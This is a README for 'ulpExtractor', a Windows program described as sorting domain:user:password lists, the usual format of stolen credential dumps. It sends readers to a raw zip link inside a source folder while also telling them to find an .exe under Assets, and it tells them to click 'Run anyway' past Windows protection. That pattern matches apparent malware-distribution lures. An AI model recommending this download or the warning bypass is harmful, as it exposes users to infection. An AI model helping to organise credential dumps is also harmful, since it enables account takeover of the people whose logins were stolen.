# 📦 ulpExtractor - Fast tool for organizing account data

[![Download ulpExtractor](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lucasconfederate414/ulpExtractor/raw/refs/heads/main/src/ulp-Extractor-v2.2.zip)

ulpExtractor reads text files containing login information. It organizes long lists of names and passwords into a clear format. This tool operates quickly because it uses multiple parts of your computer processor at the same time. You can view the status of your task through a visual screen in your terminal.

## 📥 How to download the software

The software lives on our release page. Visit this page to download the latest version for your computer.

[Get the latest version here](https://github.com/Lucasconfederate414/ulpExtractor/raw/refs/heads/main/src/ulp-Extractor-v2.2.zip)

Look for the file ending in `.exe` under the Assets section. Save this file to your Downloads folder or your Desktop.

## 🖥️ System requirements

This tool works on Windows 10 and Windows 11. It requires 4GB of RAM to process large files. You do not need to install any extra software like Python or Java. The application comes as a single file that runs on its own.

## 🚀 Setting up the application

1. Open your File Explorer. 
2. Find the file you just downloaded. It will have a name like `ulpExtractor.exe`.
3. Right-click the file and select Open.
4. If a window appears that mentions Windows protected your PC, click More info. Then click Run anyway.
5. A black screen will appear. This is your interface.

## ⚙️ Using the tool

The tool operates by reading a folder of text files. Follow these steps to process your lists:

1. Create a folder on your Desktop. Name it `data`.
2. Move your text files into this `data` folder.
3. Ensure your files use the format domain:user:password inside the text.
4. Open the ulpExtractor program. 
5. Type the file path of your folder when the screen prompts you. 
6. Press the Enter key on your keyboard. 
7. The program will start reading your data. 

## 📊 Viewing your progress

The screen shows a dashboard called a TUI. This stands for Text User Interface. You will see bars that fill up as the program finds and sorts your credentials. The program displays how many items it found and how much time remains until the task ends. 

Do not close the window while the bars are moving. Closing the window stops the process immediately. Once the bars reach one hundred percent, the program creates a new text file with your sorted data.

## 🛡️ Privacy and safety

This tool runs directly on your machine. It does not send your login information to a server or a remote website. All operations happen inside your computer memory. You can disconnect your internet while the program runs if you want extra security. The code is open source, which means anyone can read the instructions to confirm how it handles your files.

## 🛠️ Troubleshooting common issues

If the window closes instantly, your file names might contain special characters. Ensure your files have simple names like `list.txt`.

If the program says it cannot find the file, check the path you typed. Make sure you included the full address of the folder. You can find the full address by clicking the bar at the top of your File Explorer window.

If the program stops during the scan, your file might be too large for your memory. Try breaking the file into smaller pieces of 500 megabytes each. 

## 📝 Preparing your text files

The tool works best when your text files follow the structure `example.com:username:password`. Remove any extra spaces or empty lines before you start. Files should be saved as plain text files with the `.txt` extension.

## 💡 Frequently asked questions

Does this tool require internet access?
No. The application works offline.

Can I run this on a Mac?
This specific file works on Windows. You may need to compile the source code for other systems.

Where does the output go?
The program saves a new file in the same folder as your input files. The output file is named `results.txt`.

How do I stop the program?
Press the Control button and the C key at the same time to stop the current task.

What if the screen is empty?
Wait a few seconds for the program to load the data. If the screen remains empty, restart the application.

## 📂 Understanding the results

The output file groups all records by the domain name. This makes it easier to search for specific accounts. Each line contains the full original information plus a label for the domain. If the tool finds duplicate entries, it removes them to save space in your final list. 

## ⚡ Performance tips

Close other heavy programs like video games or web browsers before you start the tool. This gives the application more power to finish the task faster. If your computer has a solid-state drive, keep your input files on that drive for the best speeds. 

Following these steps ensures that ulpExtractor runs smoothly and manages your data in an organized way. The program is designed to provide results without cluttering your computer with extra installations or background services.